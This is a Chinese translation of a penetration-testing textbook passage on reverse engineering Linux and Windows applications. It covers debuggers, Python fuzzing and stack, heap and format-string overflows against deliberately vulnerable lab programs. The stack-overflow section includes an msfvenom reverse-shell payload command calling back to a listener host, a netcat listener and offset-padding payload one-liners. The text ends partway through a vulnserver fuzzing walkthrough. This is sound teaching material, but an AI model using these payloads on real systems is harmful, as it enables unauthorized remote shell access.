# Python 渗透测试实用指南（三）

> 原文：[`annas-archive.org/md5/4B796839472BFAAEE214CCEDB240AE18`](https://annas-archive.org/md5/4B796839472BFAAEE214CCEDB240AE18)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十一章：逆向工程 Linux 应用程序

逆向工程，正如我们已经知道的，是获取可执行程序并获取其源代码或机器级代码的过程，以查看工具是如何构建的，并可能利用漏洞。逆向工程的上下文中的漏洞通常是开发人员和安全研究人员发现的软件错误。在本章中，我们将看看如何使用 Linux 应用程序进行逆向工程。本章将涵盖以下主题：

+   模糊化 Linux 应用程序

+   Linux 和汇编

+   Linux 和堆栈缓冲区溢出

+   Linux 和堆缓冲区溢出

+   在 Linux 中格式化字符串错误

# 调试器

了解可执行程序行为的常规方法是将其附加到调试器，并在各个位置设置断点，以解释测试软件的代码流。**调试器**是一个软件实用程序或计算机程序，程序员可以使用它来调试他们的程序或软件。它还允许程序员查看正在执行的代码的汇编。调试器能够显示代码执行的确切堆栈。调试器能够显示高级编程语言代码的汇编级等效。因此，调试器以执行堆栈的形式显示程序的执行流程，用于函数调用的寄存器，以及程序变量的地址/值等。

让我们来看看我们将在本章中涵盖的调试器：

+   Evans Linux 调试器：这是一个本地 Linux 调试器，我们不需要 wine 来运行它；它以`tar.gz`文件的形式提供。下载源代码，提取并复制到您的计算机。所需的安装步骤如下：

```py
$ sudo apt-get install cmake build-essential libboost-dev libqt5xmlpatterns5-dev qtbase5-dev qt5-default libqt5svg5-dev libgraphviz-dev libcapstone-dev
$ git clone --recursive https://github.com/eteran/edb-debugger.git
$ cd edb-debugger
$ mkdir build
$ cd build
$ cmake ..
$ make
$ ./edb
```

要么将其添加到环境变量路径中，要么转到安装目录并运行`./edb`来启动调试器。这将给我们以下界面：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/2f9d37c5-cd50-4c93-ab78-5890ac2a424c.png)

让我们打开`edb exe/linux`文件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/95d1fae1-ceb2-49cd-9d86-b87d6fd0d2b8.png)

+   GDB/GNU 调试器：这是一个非常古老的调试器，通常在 Ubuntu 中默认找到。它是一个不错的调试器，但功能不多。要运行它，只需输入`gdb`，它的提示符就会打开。默认情况下，它是一个 CLI 工具。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/6d8fb033-ae3f-40f8-9e03-484bf219ae27.png)

+   另一个好的工具是 idea-pro，但这是一个商业工具，不是免费的。

# 模糊化 Linux 应用程序

**模糊化**是一种用于发现应用程序中的错误的技术，当应用程序收到未经应用程序预期的输入时，应用程序会崩溃。模糊化通常涉及使用自动化工具或脚本发送大型字符串到可能导致应用程序崩溃的应用程序。模糊化的想法是发现漏洞或错误，如果发现，可能会导致灾难性后果。这些漏洞可能属于以下类别之一：

+   缓冲区溢出漏洞

+   字符串格式漏洞

模糊化是将随机生成的代码发送到我们的测试程序的技术，目的是使其崩溃或查看它在不同输入下的行为。模糊化是以自动化方式向正在测试的程序发送不同长度的有效负载，以查看程序是否在任何时候表现出奇怪或意外的行为。如果在模糊化期间观察到任何异常情况，则标记导致程序出现意外行为的有效负载长度。这有助于测试人员进一步评估是否存在溢出类型的潜在漏洞。简而言之，模糊化是检测正在测试的应用程序中是否存在潜在溢出漏洞的第一步。

有效的 fuzzer 生成半有效的输入，这些输入在解析器中不会被直接拒绝，但会在程序的更深层次上创建意外行为，并且足够无效，以暴露未正确处理的边缘情况。我们可以用于 fuzzing 的一个工具是**Zzuf**。这是一个非常好的 fuzzing 工具，可以在基于 Linux 的系统上使用。安装步骤如下：

从 GitHub 源下载 Zzuf 并手动安装它，使用以下命令：

```py
./configure
make sudo make install
```

然而，在这里，我们将专注于使用我们的本机 Python 代码进行 fuzzing。要了解如何进行 fuzzing，让我们以一个示例 C 代码为例，该代码从用户那里获取输入，但没有对传递的输入执行必要的检查。

# fuzzing 在行动

让我们来看一个用 C 编写的基本代码，它接受用户输入并在终端上显示它：

```py
#include <stdio.h>
#include <unistd.h>

int vuln() {

    char arr[400];
    int return_status;

    printf("What's your name?\n");
    return_status = read(0, arr, 400);

    printf("Hello %s", arr);

    return 0;
}

int main(int argc, char *argv[]) {
    vuln();
    return 0;
}
ssize_t read(int fildes, void *buf, size_t nbytes);
```

以下表格解释了前面代码块中使用的字段：

| 字段 | 描述 |
| --- | --- |
| `int fildes` | 要读取输入的文件描述符。您可以使用从 open ([`codewiki.wikidot.com/c:system-calls:open`](http://codewiki.wikidot.com/c:system-calls:open))系统调用获得的文件描述符，或者您可以使用 0、1 或 2，分别表示标准输入、标准输出或标准错误。 |
| `const void *buf` | 读取内容存储的字符数组。 |
| `size_t nbytes` | 截断数据之前要读取的字节数。如果要读取的数据小于*n*字节，则所有数据都保存在缓冲区中。 |
| `return value` | 返回读取的字节数。如果值为负数，则系统调用返回错误。 |

我们可以看到，这个简单的程序试图从控制台读取（由文件描述符的值 0 指定），并且无论它从控制台窗口读取什么，它都试图放在本地创建的名为`arr`的数组变量中。现在`arr`在这段代码中充当缓冲区，最大大小为 400。我们知道 C 中的字符数据类型可以保存 1 个字节，这意味着只要我们的输入<=400 个字符，代码应该可以正常工作，但如果输入超过 400 个字符，我们可能会遇到溢出或分段错误，因为我们会尝试保存的内容超过了缓冲区`arr`的容量。从前面的代码中可以立即看到，超过 400 字节的输入将破坏代码。

想象一下，我们无法访问应用程序的源代码。那么，为了弄清楚缓冲区的大小，我们有以下三个选项：

+   第一个选项是对其进行逆向工程，以查看应用程序的助记符或汇编级别代码。谁想这样做呢！

+   许多现代反编译器还为我们提供了原始应用程序的源代码等效物。对于我们这样的一个小例子，这将是一个不错的选择，但如果问题中的可执行文件有数千行代码，我们可能也要避免选择这个选项。

+   第三种通常首选的方法是将应用程序视为黑盒，并确定它期望用户指定输入的位置。这些将是我们的注入点，在这些点上，我们将指定不同长度的字符串，以查看程序是否崩溃，如果崩溃，会发生在哪里。

让我们编译我们的源代码以生成我们将作为黑盒运行和 fuzz 的 C 对象文件。

默认情况下，Linux 系统是安全的，并且它们配备了各种防止缓冲区溢出的保护措施。因此，在编译源代码时，我们将禁用内置的保护，如下所示：

```py
gcc -fno-stack-protector -z execstack -o buff buff.c
```

前面的命令将产生以下截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/9887237f-aa44-4959-956c-e0e9c9992f3c.png)

让我们运行我们的对象文件，通过将`echo`命令的输出传输到它来进行单行操作。这将使用 Python 和 fuzzing 自动化：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/df6c9fe1-2555-487b-89bc-9d25ce8f7319.png)

我们知道`./buff`是我们的输出文件，可以作为可执行文件执行。假设我们知道文件的实际源代码，我们可以使用 Python 来模糊文件。让我们创建一个基本的 Python 模糊脚本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/ea636bd1-bfa9-453c-8eae-f8bdae7babb6.png)

让我们运行前面的 Python 代码，看看模糊测试的效果以及它如何使应用程序崩溃，使我们接近崩溃点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/8abd591b-7729-4753-8373-a1c64d3f3219.png)

从前面的输出可以看出，应用程序崩溃的地方在 400 到 500 字节之间，这就是实际的崩溃点。更准确地说，我们可以使用较小的步长`i`，并以`步长=10`到达以下结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/df3931d1-4420-4f51-8cc8-709bfb63a3bd.png)

前面的屏幕截图为我们提供了更详细的信息，并告诉我们应用程序在输入长度为`411`和`421`之间崩溃。

# Linux 和汇编代码

在本节中，我们将学习有关汇编语言的知识。目标是将 C 代码转换为汇编代码，并查看执行过程。我们将加载和使用的示例 C 代码如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/6254c14b-e991-49da-a77d-7377d3038bfc.png)

现在，让我们从命令行运行这个程序，作为`./buff`，并尝试将这个可执行程序附加到 Evans 调试器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/54679166-b600-4abd-b641-2a132e7c9e66.png)

现在，我们通过 GUI 将我们运行的代码附加到启动的 Evans 调试器，方法是转到**文件** | **附加**选项。我们将可执行文件附加如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/5a4876cf-56d3-4cfe-b014-f18903173f8d.png)

当我们点击**OK**时，对象文件将被附加到调试器，并且我们将能够看到与之关联的汇编级别代码，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/90514aff-7754-4012-9722-f5048cc18342.png)

窗口的右上部分显示了被测试应用程序的汇编代码。左上部分表示寄存器及其相应的内容。汇编代码下方的部分显示了用户在控制台上输入数据时将调用的方法，即我们的读取系统调用。屏幕底部的部分表示内存转储，其中以十六进制和 ASCII 格式显示了内存的内容。让我们看看当我们指定一个小于 400 个字符的值时，应用程序是如何干净地退出的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/d2baf991-ee01-4e9a-acf0-7b30a77e9089.png)

现在，让我们输入一个大于 400 字节的值，看看我们的寄存器会发生什么变化：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/d2d73e0d-8a0e-4cb2-aae5-75e1680fe732.png)

当我们传递这个输入时，我们会得到以下状态：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/6fdf4144-5758-4963-99e7-a355341bac30.png)

从前面的屏幕截图可以看出，我们传递的值被写入寄存器 RSP。对于 64 位架构，寄存器 RSP 保存下一条要执行的指令的地址，由于值从`arr`缓冲区溢出，一些值被写入寄存器 RSP。程序获取了 RSP 的内容以执行下一条指令，由于它到达了`aaaaaaaaaa`，程序崩溃了，因为这是一个无效的地址。应该注意的是，如前面的屏幕截图所示，`0X6161616161`是`aaaaaaaaaa`的十六进制等价物。

# Linux 中的堆栈缓冲区溢出

大多数漏洞是由开发人员没有考虑到的条件导致的。最常见的漏洞是堆栈缓冲区溢出。这意味着我们定义了某种不足以存储所需数据的缓冲区。当输入由最终用户控制时，这就成为了一个问题，因为这意味着它可以被利用。

在软件中，堆栈缓冲区溢出或堆栈缓冲区溢出发生在程序写入程序调用堆栈上的内存地址（正如我们所知，每个函数都有自己的执行堆栈或分配一个堆栈内存来执行）超出预期数据结构的范围时。这通常是一个固定长度的缓冲区。堆栈缓冲区溢出几乎总是导致堆栈上相邻数据的损坏，在溢出是由错误触发时，这通常会导致程序崩溃或操作不正确。

假设我们有一个可以容纳两个字节数据的内存单元`a`，并且在这个内存单元`a`旁边有另一个内存单元`b`，它也可以容纳两个字节的数据。假设这两个内存单元都放置在相邻的堆栈上。如果`a`给出超过两个字节的数据，数据将实际上溢出并被写入`b`，这是程序员所不期望的。缓冲区溢出利用了这个过程。

指令堆栈指针是指向下一条要执行的指令的地址的指针。因此，每当执行任何指令时，IP 的内容都会得到更新。当调用方法并创建该方法的激活记录时，执行以下步骤：

1.  创建激活记录或堆栈帧。

1.  **当前指令指针**（CIP）和**当前环境指针**（CEP）（来自调用者）被保存在堆栈帧上作为返回点。

1.  CEP 被分配为堆栈帧的地址。

1.  CIP 被分配为代码段中第一条指令的地址。

1.  执行从 CIP 中的地址继续。

当堆栈执行完毕并且没有更多的指令或命令可以执行时，执行以下步骤：

1.  CEP 和 CIP 的旧值从堆栈帧的返回点位置中检索出来。

1.  使用 CEP 的值，我们跳回到调用者函数。

1.  使用 CIP 的值，我们从最后一条指令中恢复处理。

默认情况下，堆栈如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/f01fc8c9-2445-4fb3-b2d7-eb1e16643d52.png)

现在可以看到返回地址位于堆栈底部，实际上包含了旧的 CEP 的值。我们称之为堆栈帧指针。在技术术语中，当缓冲区的值被覆盖并溢出时，它会完全填满与堆栈的本地变量空间相关的所有内存，然后被写入堆栈的返回地址部分，导致缓冲区溢出。当缓冲区上的所有内存空间被占用时，按照惯例，返回点的内容被提取以进行跳转回调用者。然而，由于地址被用户传递的数据覆盖，这导致了无效的内存位置，因此导致分段错误。

这就是有趣的地方。应该注意的是，用户传递的数据和堆栈的本地变量实际上是作为寄存器实现的，因此我们传递的值将存储在堆栈上的某些寄存器中。现在，由于用户传递的任何输入都被写入某些寄存器，最终被写入返回点，如果我们能够在位置`12345`的寄存器`X`中注入 shell 代码会怎么样？由于我们能够写入堆栈的返回点，如果我们在返回点写入`12345`会怎样？这将导致控制转移到位置`12345`，这将导致执行我们的 shell 代码。这就是缓冲区溢出如何被利用来授予我们受害者机器的 shell。现在我们对缓冲区溢出有了更好的理解，让我们在下一节中看看它的实际应用。

# 利用缓冲区溢出

接下来，让我们看一个容易受到缓冲区溢出攻击的代码片段。让我们看看如何模糊测试和利用这个漏洞来获取对系统的 shell 访问权限。我们在之前的部分学习了如何使用 Evans 调试器。在本节中，我们将看到如何使用`gdb`来利用缓冲区溢出。

下面是一个简单的 C 代码片段，询问用户的姓名。根据终端提供的值，它用问候消息“嘿<用户名>”来问候用户：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/3c973b3c-d6bf-4ece-b71c-c83fa4fc9cd8.png)

让我们使用以下命令编译应用程序，禁用堆栈保护：

```py
gcc -fno-stack-protector -z execstack -o bufferoverflow bufferoverflow.c 
```

这将创建一个名为`bufferoverflow`的目标文件，可以按以下方式运行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/4f051243-424d-40ca-929f-a277d0f85b06.png)

现在我们的下一步是生成一个会导致应用程序崩溃的有效负载。我们可以使用 Python 来实现这一点：

```py
python -c "print 'A'*500" > aaa
```

上述命令将创建一个包含 500 个*A*的文本文件。让我们将其作为输入提供给我们的代码，看看是否会崩溃：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/babc924e-32f8-42d2-b7fc-32a886226d94.png)

正如我们之前学到的，计算机通过*寄存器*来管理栈。寄存器充当内存中的专用位置，用于在处理数据时存储数据。大多数寄存器临时存储处理的值。在 64 位架构中，**寄存器堆栈指针**（**RSP**）和**寄存器基址指针**（**RBP**）尤为重要。

程序使用 RSP 寄存器来记住栈中的位置。RSP 寄存器将根据栈中添加或移除的任务而上下移动。RBP 寄存器用于记住栈的末尾位置。

通常，RSP 寄存器将指示程序从哪里继续执行。这包括跳入函数、跳出函数等。这就是为什么攻击者的目标是控制 RSP 指向程序执行的位置。

现在，让我们尝试使用`gdb`运行相同的代码，找到崩溃发生时 RSP 寄存器的值：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/b41f48fb-c6ac-4169-8461-b1e1925510c9.png)

如图所示，我们只需发出`run`命令并将其传递给创建的输入文件，程序就会崩溃。让我们试着了解崩溃时所有寄存器的状态：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/8c3414f4-c4ca-4a55-9655-41395fb3f479.png)

info registers 显示的两列告诉我们寄存器的地址，以十六进制和十进制格式显示。我们知道这里感兴趣的寄存器是 RSP，因为 RSP 将保存下一个要执行的指令的地址，由于它被损坏并被字符串 A 覆盖，导致了崩溃。让我们检查崩溃时 RSP 的内容。让我们还检查其他寄存器的内容，看看我们的输入字符串`aaaaa`写在了哪里。我们检查其他寄存器的原因是确定我们可以放置有效负载的寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/f9f906cf-df0d-4eee-945b-21c20484d401.png)

从上面的截图中，我们可以验证输入字符串 aaaa，其十六进制等价物为`0x414141`，被放置在 RSP 中，导致崩溃。有趣的是，我们还看到该字符串被放置在寄存器`r9`和`r11`中，使它们成为我们利用代码的潜在候选者。但在那之前，我们需要找出我们的 500 个字符输入中的缓冲区 RSP 何时被覆盖。如果我们得到该偏移量的确切位置，我们将设计我们的有效负载以在该偏移量处放置跳转指令，并尝试跳转到寄存器`r9`或`r11`，在那里我们将放置我们的 shell 代码。为了找出确切的偏移量，我们将使用 Metasploit 的 Ruby 模块生成一组唯一的字符组合：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/a0d20d71-f944-4adb-a3a0-d7eb0a34181b.png)

现在，由于我们将这个唯一生成的字符串放在一个名为`unique`的文件中，让我们重新运行应用程序，这次将`unique`文件内容传递给程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/be6e3c5f-0ba1-4c2e-b860-065a20121d5e.png)

现在，在这一点上，寄存器 RSP 的内容是`0x6f41316f`，这是十六进制。ASCII 等价物是`o1Ao`。

由于寄存器 RSP 的内容是小端格式，我们实际上需要将`0x6f31416f`转换为其 ASCII 等价物。必须注意的是，IBM 的 370 大型机，大多数[RISC](https://search400.techtarget.com/definition/RISC)架构的计算机和 Motorola 微处理器使用大端方法。另一方面，英特尔[处理器](https://whatis.techtarget.com/definition/processor)（CPU）和 DEC Alphas 以及至少一些在它们上运行的程序是小端的。

我们将再次使用 Metasploit Ruby 模块来获取这个唯一值的偏移量，以找到我们有效负载的确切位置。之后，我们应该放置跳转指令，使 RSP 跳转到我们选择的位置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/1a1b3edf-db63-4d94-a537-46e7e3849b43.png)

因此，我们知道在地址`424`之后写入的下一个八个字节将被写入我们的`rsp`寄存器。让我们尝试写入`bbbb`，看看是否是这种情况。我们生成的有效负载将如下所示：`424*a + 4*b + 72*c`。要使用的确切命令是这个：

```py
python -c "print 'A'*424+ 'b'*4 + 'C'*72" > abc
```

现在，鉴于我们已经验证了我们可以控制寄存器 RSP，让我们尝试攻击 r9 寄存器，以容纳我们的 shell 代码。但在这样做之前，重要的是我们知道 r9 寄存器的位置。在下面的屏幕截图中，我们可以看到 r9 寄存器的内存位置是`0x7fffffffded0`，但每次程序重新加载时都会发生变化：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/858efe7d-0f3e-47f7-8aae-6487e4ed1e46.png)

有两种方法可以解决这个问题。第一种方法是通过在操作系统级别禁用动态地址更改来避免它，可以在以下屏幕截图中看到。另一种方法是找到具有`jmp r9`命令的任何指令的地址**。**我们可以在程序的整个汇编代码中搜索`jmp r9`，然后将位置的地址放入我们的寄存器 RSP，从而避免动态地址更改。我将把这留给你自己去想出并做。在本节中，让我们通过执行以下操作来禁用动态地址加载：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/f236b2f1-2a66-4009-8a3b-4b4158a2a706.png)

现在，由于我们正在使用 Kali 机器，让我们生成一个将放置在我们最终的利用代码中的反向 shell 有效负载：

```py
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.250.147 LPORT=4444  -e x64/xor ‐b "\x00\x0a\x0d\x20" -f py
```

为了找出正在测试的底层软件的常见坏字符，最成功的方法是反复试验。我通常用来找出常见的坏字符的方法是将所有唯一字符发送到应用程序，然后使用调试器，检查寄存器级别发生了哪些字符变化。发生变化的字符可以被编码和避免。

上述命令将产生以下屏幕截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/7cb23632-599f-497d-8950-83e4e61d739f.png)

让我们创建一个名为`exp_buf.py`的 Python 文件，并将获取的 shell 代码放入该文件中。必须注意的是，由于我们正在对有效负载进行编码，我们还需要一些字节在开头进行解码，因此我们将在开头指定一些`nop`字符。我们还将在端口`4444`上设置一个 netcat 监听器，以查看我们是否从应用程序获得了反向 shell。记住 r9 寄存器的地址；我们也将使用它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/7977e329-ec66-4112-a0ff-edd3d041a37b.png)

上述 Python 代码打印了我们需要的有效负载，以通过我们创建的易受攻击的缓冲区溢出代码获取反向 shell。让我们将这个有效负载输入到一个名为`buf_exp`的文件中，我们将在`edb`中使用它来利用代码。输入以下命令来运行代码：

```py
python exp_buf.py > exp_buf
```

现在让我们在端口 4444 上设置一个 netcat 监听器，它将监听反向载荷，这将反过来给我们 shell：

```py
nc -nlvp 4444 
```

现在，用`gdb`运行应用程序，并尝试利用它，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/3f4d655a-e0ea-4c19-975d-a0b0206014c8.png)

哎呀！代码成功地生成了一个新的 shell 进程。让我们检查一下我们的 netcat 监听器得到了什么：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/d1832b93-bb79-428e-9643-6972f73c6c24.png)

因此可以验证，我们成功地使用 Python 和`gdb`创建了一个反向 shell。

# Linux 中的堆缓冲区溢出

应该注意的是，导致堆栈缓冲区溢出的变量、缓冲区或存储的范围被限制在声明它的函数（局部变量）中，并且其范围在函数内。由于我们知道函数是在堆栈上执行的，这个缺陷导致了堆栈缓冲区溢出。

在堆缓冲区溢出的情况下，影响会更大一些，因为我们试图利用的变量不是存储在堆栈上，而是存储在堆上。在同一方法中声明的所有程序变量都在堆栈中分配内存。然而，在运行时动态分配内存的变量不能放在堆栈中，而是放在堆中。因此，当程序通过`malloc`或`calloc`调用为变量分配内存时，实际上是在堆上分配内存，而在堆缓冲区溢出的情况下，这些内存就会溢出或被利用。让我们看看这是如何工作的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/1add16a5-8404-440a-8a38-665749741721.png)

现在继续编译代码，禁用内置保护，如所示。请注意，`-fno-stack-protector`和`-z execstack`是用于禁用堆栈保护并使其可执行的命令。

```py
gcc -fno-stack-protector -z execstack heapBufferOverflow.c -o heapBufferOverflow
```

现在我们已经编译了应用程序，让我们用会导致代码执行的输入类型来运行它，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/a0447202-627a-4a40-8dad-10a2f0204e34.png)

前面的截图给出了堆缓冲区溢出的起点。我们将留给读者去发现如何进一步利用它并从中获得一个反向 shell。所采用的方法与我们先前使用的方法非常相似。

# 字符串格式漏洞

无控制的格式字符串利用可以用于使程序崩溃或执行有害代码。问题源于在执行格式化的某些 C 函数中，如`printf()`中，使用未经检查的用户输入作为字符串参数。恶意用户可以使用`%s`和`%x`等格式标记，从调用堆栈或可能是内存中的其他位置打印数据。我们还可以使用`%n`格式标记，在堆栈上存储的地址上写入格式化的字节数，这会命令`printf()`和类似函数将任意数据写入任意位置。

让我们尝试通过以下一段示例代码进一步理解这一点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/bb027593-7b28-4072-b6e3-c994015f757d.png)

现在，继续编译代码，禁用内置保护，如所示：

```py
 gcc formatString.c -o formatString
```

请注意，print 函数将第一个参数作为格式字符串（`%s`、`%c`、`%d`等）。在前面的情况下，`argv[1]`可以用作格式字符串，并打印任何内存位置的内容。前面的代码是有漏洞的。然而，如果它是按照下面所示的方式编写的，那么漏洞就不会存在：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/d910a09a-0984-4100-81eb-55f558ac0eec.png)

现在我们已经编译了应用程序，让我们用会导致代码执行的输入类型来运行它，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/f30ddab8-5855-4219-acfc-bbffd7c57925.png)

让我们用格式字符串漏洞来破坏代码，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/fc965f14-8d38-4216-83f7-fa7246204955.png)

前面的截图给出了一个起点；同样，我们将留给读者去探索如何进一步利用这一点。建议您尝试我们之前详细讨论过的相同方法。

# 总结

在本章中，我们讨论了 Linux 中的逆向工程。我们还学习了使用 Python 进行模糊测试。我们在 Linux 调试器（`edb`和`gdb`）的上下文中查看了汇编语言和助记符。我们详细讨论了堆栈缓冲区溢出，并了解了堆缓冲区溢出和字符串格式漏洞的概念。我强烈建议花费大量时间来研究这些想法，并在不同的操作系统版本和易受攻击的应用程序上进行探索。到本章结束时，您应该对 Linux 环境中的缓冲区溢出漏洞和逆向工程有一个相当好的理解。

在下一章中，我们将讨论 Windows 环境中的逆向工程和缓冲区溢出漏洞。我们将演示如何利用真实应用程序进行利用。

# 问题

1.  我们如何自动化利用缓冲区溢出漏洞的过程？

1.  我们可以采取什么措施来避免操作系统施加的高级保护，比如禁用堆栈上的代码执行？

1.  我们如何处理地址随机化？

# 进一步阅读

+   堆栈缓冲区溢出交火：[`www.doyler.net/security-not-included/crossfire-buffer-overflow-linux-exploit`](https://www.doyler.net/security-not-included/crossfire-buffer-overflow-linux-exploit)

+   堆栈缓冲区溢出交火：[`www.whitelist1.com/2016/11/stack-overflow-8-exploiting-crossfire.html`](https://www.whitelist1.com/2016/11/stack-overflow-8-exploiting-crossfire.html)

+   堆缓冲区溢出：[`www.win.tue.nl/~aeb/linux/hh/hh-11.html`](https://www.win.tue.nl/~aeb/linux/hh/hh-11.html)

+   字符串格式漏洞：[`null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0x14-format-string-vulnerability-part-i-buffer-overflows-nasty-little-brother-0167254/`](https://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0x14-format-string-vulnerability-part-i-buffer-overflows-nasty-little-brother-0167254/)


# 第十二章：逆向工程 Windows 应用程序

在本章中，我们将看看如何对 Windows 应用程序进行逆向工程。在本章中，我们将涵盖以下主题：

+   Fuzzing Windows 应用程序

+   Windows 和汇编

+   Windows 和堆缓冲区溢出

+   Windows 和堆缓冲区溢出

+   Windows 中的格式化字符串漏洞

# 调试器

让我们来看看我们将在本章中涵盖的 Windows 调试器：

+   **Immunity debugger**：这是一个在 Windows 环境中运行并调试 Windows 应用程序的最著名的调试器之一。它可以从[`www.immunityinc.com/products/debugger/`](https://www.immunityinc.com/products/debugger/)下载，并且作为可执行文件直接运行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/99762647-1633-411f-ac78-d433260892d0.png)

+   **Olly debugger**：可以直接从[`www.ollydbg.de/`](http://www.ollydbg.de/)下载 Olly 调试器。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/eac337e6-ad53-400d-8625-9dcf12a1a868.png)

# Fuzzing Windows 应用程序

正如我们在上一章中讨论的那样，Fuzzing 是一种用于发现应用程序中的错误的技术，当应用程序遇到未预料到的输入时，会导致应用程序崩溃。

为了开始这个练习，让我们设置 VirtualBox，并使用 Windows 作为操作系统。在实验室的 Windows 7 机器上，让我们继续安装名为**vulnserver**的易受攻击的软件。如果你在 Google 上搜索`vulnserver download`，你会得到易受攻击的服务器的链接。

现在让我们在 VirtualBox 中加载`vulnserver`并运行它，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/c12c1857-6eba-469b-9e71-647f37d9a26a.png)

现在让我们尝试将 Linux 主机连接到 Windows 机器，以连接到`vul`服务器。

我们可以用于 Fuzzing 的工具是 zzuf，它可以与基于 Linux 的系统一起使用。要检查工具是否可用，请运行以下命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/86e76679-2f8b-4fae-9c56-6463fd0cbc19.png)

让我们看看当我们输入一个长字符串时是否会崩溃。我们可以通过将`aaaaaa`字符串传递给代码来检查这一点，并且可以看到它不会崩溃。另一种方法是运行`help`命令，我们传递`help`命令并返回到终端，这样我们可以递归地在循环中执行它。如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/e6521c01-c09e-4271-bbb6-9824e5795647.png)

应该注意，如果我们希望使用`echo`执行命令，我们可以将该命令放在反引号`<command>`中，该命令的输出将附加到`echo`打印字符串，例如：`echo 'hello' `python -c 'print "a"*5'``。

我们将使用这种技术来崩溃目标服务器，因为执行的命令的输出将附加到`echo`的输出，并且`echo`的输出通过 Netcat 作为输入发送到服务器。我们将执行以下代码，看看易受攻击的服务器是否会因为一个非常长的字符串而崩溃：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/ec17126b-0386-4e18-b98d-1c3de47f8959.png)

我们可以清楚地看到，在执行上述命令时，程序打印出`UNKNOWN COMMAND`。基本上，这里发生的是`aaaaaa`被分割成多行，并且输入被发送到 Netcat，如下所示：`echo hello aaaaaaaaaaaaaaaaaaa | nc …`。在下一行，剩下的`aaaa`被打印出来，这就引发了`UNKNOWN COMMAND`错误。

让我们尝试将打印输出重定向到一些文本文件，然后使用`zzuf`来实际崩溃或模糊目标易受攻击的软件。

Zzuf 是一个工具，它以大字符串作为输入，例如`aaaaaaaaaaaaaaaaaaaaaaaaa`。它在字符串的各个位置随机放置特殊字符，并产生输出，例如`?aaaa@??aaaaaaaaaaa$$`。我们可以指定百分比来修改输入的多少，例如：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/e77287d6-a6db-4f9b-9814-a89371ca0ec6.png)

让我们使用生成的文件`fuzz.txt`和 zzuf，看看结果如何：

